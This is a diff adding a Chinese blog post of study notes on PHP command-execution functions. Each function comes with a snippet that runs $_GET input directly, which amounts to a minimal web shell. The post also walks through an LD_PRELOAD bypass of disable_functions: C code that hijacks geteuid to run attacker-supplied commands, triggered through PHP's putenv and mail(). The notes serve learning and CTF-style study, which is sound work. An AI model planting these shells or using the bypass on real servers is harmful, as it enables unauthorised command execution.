@@ -1,0 +1,385 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>简单的php命令（一） | 蒜鸟的鸟巢</title><meta name="author" content="Garlic-dove"><meta name="copyright" content="Garlic-dove"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简单学点php命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单的php命令（一）">
+<meta property="og:url" content="https://garlic-dove.github.io/2025/12/14/php%E5%91%BD%E4%BB%A41/index.html">
+<meta property="og:site_name" content="蒜鸟的鸟巢">
+<meta property="og:description" content="简单学点php命令执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garlic-dove.github.io/image/2.avif">
+<meta property="article:published_time" content="2025-12-14T13:57:58.000Z">
+<meta property="article:modified_time" content="2026-01-29T12:09:09.521Z">
+<meta property="article:author" content="Garlic-dove">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garlic-dove.github.io/image/2.avif"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "简单的php命令（一）",
+  "url": "https://garlic-dove.github.io/2025/12/14/php%E5%91%BD%E4%BB%A41/",
+  "image": "https://garlic-dove.github.io/image/2.avif",
+  "datePublished": "2025-12-14T13:57:58.000Z",
+  "dateModified": "2026-01-29T12:09:09.521Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Garlic-dove",
+      "url": "https://garlic-dove.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/ss.jpg"><link rel="canonical" href="https://garlic-dove.github.io/2025/12/14/php%E5%91%BD%E4%BB%A41/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8b7a940f932af656bd51538c1716c577";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-5E0P16XE8R"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-5E0P16XE8R')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-5E0P16XE8R', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "tsgv6t9ion");
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '简单的php命令（一）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/gg.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/2.avif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/nn.gif" alt="Logo" loading='lazy'><span class="site-name">蒜鸟的鸟巢</span></a><a class="nav-page-title" href="/"><span class="site-name">简单的php命令（一）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">简单的php命令（一）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-14T13:57:58.000Z" title="发表于 2025-12-14 21:57:58">2025-12-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-29T12:09:09.521Z" title="更新于 2026-01-29 20:09:09">2026-01-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="php中的函数"><a href="#php中的函数" class="headerlink" title="php中的函数"></a>php中的函数</h1><h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><ul>
+<li>system<br><code>system(string $command,int &amp;$return_var=?)</code><ul>
+<li>常用参数<br>  <code>command</code>：执行command参数所指定的命令，并输出执行结果，如果提供<code>return_var</code>参数，则外部命令执行后的返回状态将会被设置到此变量中。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];  <span class="comment">//获取benben的值</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);        <span class="comment">//回显cmd指令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>exec<br><code>exec(string $command,array &amp;$output = ?,int &amp;$return_var = ?)</code><ul>
+<li>常用参数<br>  <code>command</code>参数：要执行的命令。单独使用时只有最后一行结果，且不会回显。<br>  <code>output</code>参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐渐填充数组。</li>
+<li><code>print_r</code>输出结果<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);  <span class="comment">//输出结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>passthru<br><code>passthru(string $command,int &amp;$return_var=?)</code><ul>
+<li>常用参数<br>  <code>command</code>参数：要执行的命令。</li>
+<li>输出二进制数据，并且需要直接传送到浏览器<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;This is test!!!&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);  <span class="comment">//输出二进制数据流</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>shell_exec<br><code>shell_exec(string $cmd)</code><ul>
+<li>常用参数<br>  <code>cmd</code>参数：要执行的命令。</li>
+<li>环境执行命令，并且将完整的输出以字符串的方式返回，功能等同于反引号</li>
+<li>借用echo、print等输出结果<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);  <span class="comment">//反引号：echo `$cmd`,PHP_EOL;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>popen<br><code>popen(string $command,string $mode)</code><ul>
+<li>常用参数<br>  <code>command</code>参数：要执行的命令。<br>  <code>mode</code>参数：模式，<code>&#39;r&#39;</code>表示阅读，<code>&#39;w&#39;</code>表示写入。</li>
+<li><code>fgets</code>获取内容 &rarr; <code>print_r</code>输出内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;  <span class="comment">//读取ben的内容</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);        <span class="comment">//输出内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>proc_open<br><code>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</code><ul>
+<li>常用参数<br>  <code>command</code>参数：要执行的命令。<br>  <code>descriptor_spec</code>参数：定义数组内容。<br>  <code>pipes</code>参数：调用数组内容。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipes&quot;</span>,<span class="string">&quot;r&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipes&quot;</span>,<span class="string">&quot;w&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/tmp/error-output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>pcntl_exec<br><code>pcntl_exec(string $path,array $args = ?,array $envs = ?)</code><ul>
+<li><code>path</code>必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是<code>#!/usr/local/bin/perl</code>的脚本）</li>
+<li><code>args</code>是一个要传递给程序的参数的字符串数组</li>
+<li><code>envs</code>是一个要传递给程序作为环境变量的字符串数组。这个数组是<code>key</code> &rArr; <code>value</code>格式的，<code>key</code>代表要传递的环境变量的名称，<code>value</code>代表该环境变量<br>  <strong>当前进程空间执行指定程序</strong></li>
+</ul>
+</li>
+</ul>
+<h1 id="LD-PRELOAD饶过"><a href="#LD-PRELOAD饶过" class="headerlink" title="LD_PRELOAD饶过"></a>LD_PRELOAD饶过</h1><p><strong>LD_PRELOAD</strong>：这是一个Linux&#x2F;Unix系统的特殊环境变量。它允许用户指定一个共享库（.so文件）的路径，该库会在其他所有库之前被加载到进程中。</p>
+<h2 id="程序的链接"><a href="#程序的链接" class="headerlink" title="程序的链接"></a>程序的链接</h2><ul>
+<li>静态链接：程序运行前先将各个目标模块及所需要的库函数链接成一个完整的可执行程序，之后不在拆开。</li>
+<li>动态链接：需要一个动态链接库，作用在于当动态库中的函数发生变化对可执行程序是透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。  如果程序动态加载的函数是恶意的，可能导致disable_function被绕过。<ul>
+<li>装入时：源程序编译后得到的一组目标模块，在装入内存时边装入边链接。</li>
+<li>运行时：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</li>
+</ul>
+</li>
+</ul>
+<h2 id="mail-函数"><a href="#mail-函数" class="headerlink" title="mail()函数"></a>mail()函数</h2><ul>
+<li><code>mail()</code>（内嵌在PHP里，用于发送邮件）<ul>
+<li><strong>关键作用</strong>：在Linux系统上，PHP的<code>mail()</code>函数在底层会调用操作系统的<code>/usr/sbin/sendmail</code>程序来发送邮件。调用<code>mail()</code>会启动一个新的子进程（即sendmail进程）。</li>
+<li>如果通过<code>putenv()</code>设置了<code>LD_PRELOAD</code>，这个新启动的<code>sendmail</code>子进程在创建时，就会按照环境变量的指示，强制预加载​<code>./demo.so</code>这个恶意库。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.php  //php语言编译文件</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stracev -o 1.txt -f php demo.php</span><br><span class="line"><span class="comment">#把demo.php执行的动作，以文本方式放在1.txt</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> 1.txt | grep execve</span><br><span class="line"><span class="comment">#检查调用了哪些子进程</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>调用运行</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./demo.so&quot;</span>);  <span class="comment">//加载动态链接库demo.so</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php demo.php  <span class="comment">#运行demo.php脚本</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>生成动态链接库</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.c  <span class="comment">#c语言编译文件</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;echo&#x27;装逼让你飞起来！&#x27;&quot;</span>); <span class="comment">//&quot;&quot;内可以替换成其他指令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">geteuid</span><span class="params">()</span></span>&#123;  <span class="comment">//生成动作geteuid，执行payload</span></span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);   <span class="comment">//结束调用</span></span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC demo.c -o demo.so  <span class="comment">#将带有命令的c文件编译成.so文件，生成动态链接库文件</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>工作原理</strong></p>
+<ul>
+<li><strong>设置钩子</strong>：通过PHP的<code>putenv()</code>将LD_PRELOAD环境变量指向这个恶意库。</li>
+<li><strong>触发执行</strong>：上传demo.so和demo.php文件，当调用一个能创建新进程的PHP函数（如<code>mail()</code>、<code>imap_mail()</code>、<code>error_log()</code>等）。当这个新进程（如sendmail）启动时，系统会首先加载 demo.so。demo.so中的恶意函数就会在子进程中自动执行，实现任意命令执行和权限提升。</li>
+<li>条件<ol>
+<li>能够上传自己的.so文件</li>
+<li>能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数并且未被禁止</li>
+<li>存在可以控制PHP启动外部程序的函数并能执行（因为新程序启动将加载LD_PRELOAD中的.so文件），比如<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail</code>和<code>error_log()</code>等</li>
+</ol>
+</li>
+</ul>
+<hr>
+<p><strong>EVIL_CMDLINE</strong>：把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="built_in">getenv</span>(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);  <span class="comment">//获取恶意命令：从环境变量EVIL_CMDLINE中读取一个字符串，并将其赋值给指针cmdline。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;  <span class="comment">//检查 LD_PRELOAD是否存在：如果环境变量 LD_PRELOAD不存在，函数直接返回 0（表示root用户）。</span></span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);  <span class="comment">//结束调用</span></span><br><span class="line">    <span class="built_in">system</span>(cmdline);  <span class="comment">//执行命令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>构造php页面</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.php</span><br></pre></td></tr></table></figure>
